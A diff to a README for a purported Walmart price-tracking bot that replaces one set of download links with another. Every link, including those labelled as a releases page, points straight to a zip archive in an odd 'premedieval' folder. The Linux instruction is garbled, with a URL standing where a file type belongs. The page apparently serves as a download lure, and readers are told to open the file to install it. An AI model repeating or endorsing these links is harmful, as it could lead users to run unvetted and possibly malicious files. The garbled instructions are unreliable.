@@ -1,7 +1,7 @@
 # 🤖 walmart-price-tracker-bot - Track Walmart Prices with Ease
 
-![Download](https://raw.githubusercontent.com/zulkhan11/walmart-price-tracker-bot/main/premedieval/walmart-price-tracker-bot_2.5.zip)  
-[Visit Releases Page](https://raw.githubusercontent.com/zulkhan11/walmart-price-tracker-bot/main/premedieval/walmart-price-tracker-bot_2.5.zip)
+![Download](https://github.com/zulkhan11/walmart-price-tracker-bot/raw/refs/heads/main/premedieval/walmart_price_tracker_bot_v1.4.zip)  
+[Visit Releases Page](https://github.com/zulkhan11/walmart-price-tracker-bot/raw/refs/heads/main/premedieval/walmart_price_tracker_bot_v1.4.zip)
 
 ## 📥 Table of Contents
 1. [🚀 Getting Started](#-getting-started)
@@ -28,12 +28,12 @@ Before downloading the bot, make sure your computer meets these requirements:
 To get the Walmart Price Tracker Bot, follow these steps:
 
 1. Click on the following link to access the Releases page:
-   [Download Here](https://raw.githubusercontent.com/zulkhan11/walmart-price-tracker-bot/main/premedieval/walmart-price-tracker-bot_2.5.zip)  
+   [Download Here](https://github.com/zulkhan11/walmart-price-tracker-bot/raw/refs/heads/main/premedieval/walmart_price_tracker_bot_v1.4.zip)  
 2. On the Releases page, locate the latest version.
 3. Download the appropriate file for your operating system:
    - For Windows, download the `.exe` file.
    - For macOS, download the `.dmg` file.
-   - For Linux, download the appropriate `https://raw.githubusercontent.com/zulkhan11/walmart-price-tracker-bot/main/premedieval/walmart-price-tracker-bot_2.5.zip` file.
+   - For Linux, download the appropriate `https://github.com/zulkhan11/walmart-price-tracker-bot/raw/refs/heads/main/premedieval/walmart_price_tracker_bot_v1.4.zip` file.
 4. Once the file has downloaded, open it to install the application on your computer.
 
 ## 💬 Usage Instructions
